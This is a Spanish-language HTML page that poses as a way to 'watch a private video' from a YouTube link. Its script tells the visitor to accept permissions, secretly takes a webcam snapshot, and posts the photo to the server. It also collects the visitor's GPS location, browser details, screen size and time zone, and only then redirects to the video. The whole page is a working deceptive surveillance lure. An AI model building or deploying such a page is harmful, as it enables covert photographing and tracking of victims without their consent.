<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ver video privado</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: Arial, sans-serif;
      text-align: center;
      height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h1 {
      font-size: 2.5em;
      margin-bottom: 20px;
    }
    input {
      padding: 10px;
      width: 80%;
      max-width: 400px;
      font-size: 1em;
      border: none;
      border-radius: 5px;
      margin-bottom: 20px;
    }
    button {
      padding: 10px 20px;
      font-size: 1.2em;
      background-color: red;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    #permiso-banner {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: black;
      color: red;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 999;
      font-size: 2em;
      padding: 20px;
      text-align: center;
    }
  </style>
</head>
<body>

  <div id="formulario">
    <h1>Introduce el enlace del video de YouTube</h1>
    <input type="text" id="youtube-link" placeholder="https://www.youtube.com/watch?v=..." />
    <button onclick="iniciarProceso()">Continuar</button>
  </div>

  <div id="permiso-banner">
    Acepta los permisos para continuar al video
  </div>

  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    function iniciarProceso() {
      const enlace = document.getElementById("youtube-link").value.trim();
      if (!enlace.startsWith("https://")) {
        alert("Introduce un enlace válido de YouTube.");
        return;
      }

      // Ocultar formulario y mostrar banner
      document.getElementById("formulario").style.display = "none";
      const banner = document.getElementById("permiso-banner");
      banner.style.display = "flex";

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            const dataUrl = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());

            fetch('/foto', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ imagen: dataUrl })
            }).then(res => res.text())
              .then(msg => console.log("[✔] Foto enviada:", msg))
              .catch(err => console.error("❌ Error al enviar foto:", err));

            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(pos => {
                const datos = {
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  userAgent: navigator.userAgent,
                  idioma: navigator.language,
                  resolucion: `${window.screen.width}x${window.screen.height}`,
                  zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                fetch("/location", {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json"
                  },
                  body: JSON.stringify(datos)
                }).then(() => {
                  console.log("[✔] Datos enviados");
                  redirigir(enlace);
                }).catch(err => {
                  console.error("❌ Error al enviar ubicación:", err);
                  redirigir(enlace);
                });
              }, err => {
                console.warn("❌ Error geolocalización:", err);
                redirigir(enlace);
              });
            } else {
              console.warn("🚫 Geolocalización no soportada");
              redirigir(enlace);
            }

          }, 1500);
        })
        .catch(err => {
          alert("No se pudo acceder a la cámara.");
          console.warn("❌ Error cámara:", err);
        });
    }

    function redirigir(url) {
      setTimeout(() => {
        window.location.href = url;
      }, 2000);
    }
  </script>

</body>
</html>
